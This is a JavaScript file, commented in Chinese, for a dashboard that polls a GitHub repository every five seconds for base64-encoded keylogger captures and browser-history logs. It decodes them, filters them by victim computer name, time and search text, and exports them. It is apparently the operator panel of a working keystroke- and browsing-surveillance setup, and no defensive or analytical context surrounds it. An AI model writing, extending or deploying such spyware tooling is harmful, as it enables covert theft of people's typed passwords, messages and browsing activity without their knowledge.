// 配置
const CONFIG = {
    updateInterval: 5000, // 更新間隔（毫秒）
    maxLogs: 100, // 最大顯示日誌數
    endpoints: {
        keyboard: 'https://api.github.com/repos/appy002255/text/contents/keylog.json',
        browser: 'https://api.github.com/repos/appy002255/text/contents/browser_history.json'
    }
};

// 全局變量
let currentLogs = [];
let computerNames = new Set();

// 顯示狀態消息
function showStatus(message, isError = false) {
    const status = document.getElementById('status');
    status.textContent = message;
    status.className = `status ${isError ? 'error' : 'success'}`;
    status.style.display = 'block';
    setTimeout(() => {
        status.style.display = 'none';
    }, 3000);
}

// 解碼 Base64 內容
function decodeBase64Content(content) {
    try {
        const decoded = atob(content);
        return JSON.parse(decoded);
    } catch (e) {
        console.error('解碼失敗:', e);
        return [];
    }
}

// 更新電腦名稱下拉選單
function updateComputerFilter(logs) {
    const computerFilter = document.getElementById('computerFilter');
    const currentValue = computerFilter.value;
    
    // 收集所有電腦名稱
    const computerNames = new Set();
    logs.forEach(log => {
        if (log.computer_name) {
            computerNames.add(log.computer_name);
        }
    });
    
    // 更新下拉選單
    const oldOptions = Array.from(computerFilter.options).map(opt => opt.value);
    const newOptions = Array.from(computerNames);
    
    if (JSON.stringify(oldOptions) !== JSON.stringify(['', ...newOptions])) {
        computerFilter.innerHTML = '<option value="">所有電腦</option>';
        newOptions.forEach(name => {
            const option = document.createElement('option');
            option.value = name;
            option.textContent = name;
            computerFilter.appendChild(option);
        });
        
        // 恢復之前的選擇
        if (currentValue && newOptions.includes(currentValue)) {
            computerFilter.value = currentValue;
        }
    }
}

// 過濾日誌
function filterLogs() {
    const computerFilter = document.getElementById('computerFilter').value;
    const startTime = document.getElementById('startTime').value;
    const endTime = document.getElementById('endTime').value;
    const searchText = document.getElementById('searchInput').value.toLowerCase();
    
    return currentLogs.filter(log => {
        // 電腦名稱過濾
        if (computerFilter && log.computer_name !== computerFilter) {
            return false;
        }
        
        // 時間範圍過濾
        const logTime = new Date(log.timestamp);
        if (startTime && logTime < new Date(startTime)) {
            return false;
        }
        if (endTime && logTime > new Date(endTime)) {
            return false;
        }
        
        // 文本搜索
        if (searchText) {
            const searchableText = `${log.computer_name || ''} ${log.text || ''} ${log.url || ''}`.toLowerCase();
            return searchableText.includes(searchText);
        }
        
        return true;
    });
}

// 顯示日誌
function displayLogs(logs) {
    const logsContainer = document.getElementById('logs');
    logsContainer.innerHTML = '';
    
    if (logs.length === 0) {
        logsContainer.innerHTML = `
            <div class="log-entry">
                <div class="text-content">暫無記錄</div>
            </div>
        `;
        return;
    }
    
    logs.forEach(log => {
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        
        // 根據日誌類型顯示不同內容
        const isKeyboardLog = 'text' in log;
        const content = isKeyboardLog ? log.text : `訪問: ${log.url}`;
        
        logEntry.innerHTML = `
            <div class="timestamp">${log.timestamp}</div>
            ${log.computer_name ? `<div class="computer-name">電腦: ${log.computer_name}</div>` : ''}
            <div class="text-content">${content}</div>
        `;
        logsContainer.appendChild(logEntry);
    });
}

// 導出日誌
function exportLogs() {
    const filteredLogs = filterLogs();
    const logType = document.getElementById('logType').value;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `${logType}-logs-${timestamp}.json`;
    
    const blob = new Blob([JSON.stringify(filteredLogs, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showStatus('記錄已導出');
}

// 加載日誌
async function loadLogs() {
    try {
        const logType = document.getElementById('logType').value;
        const endpoint = CONFIG.endpoints[logType];
        
        const response = await fetch(endpoint);
        if (!response.ok) {
            throw new Error('暫無日誌記錄');
        }
        
        const data = await response.json();
        currentLogs = decodeBase64Content(data.content);
        
        // 更新電腦過濾器
        updateComputerFilter(currentLogs);
        
        // 顯示過濾後的日誌
        const filteredLogs = filterLogs();
        displayLogs(filteredLogs);
        
    } catch (error) {
        console.error('Error loading logs:', error);
        currentLogs = [];
        displayLogs([]);
    }
}

// 事件監聽器
document.getElementById('logType').addEventListener('change', loadLogs);
document.getElementById('computerFilter').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('startTime').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('endTime').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('searchInput').addEventListener('input', () => displayLogs(filterLogs()));
document.getElementById('exportBtn').addEventListener('click', exportLogs);

// 定期更新日誌
setInterval(loadLogs, CONFIG.updateInterval);
loadLogs(); // 初始加載 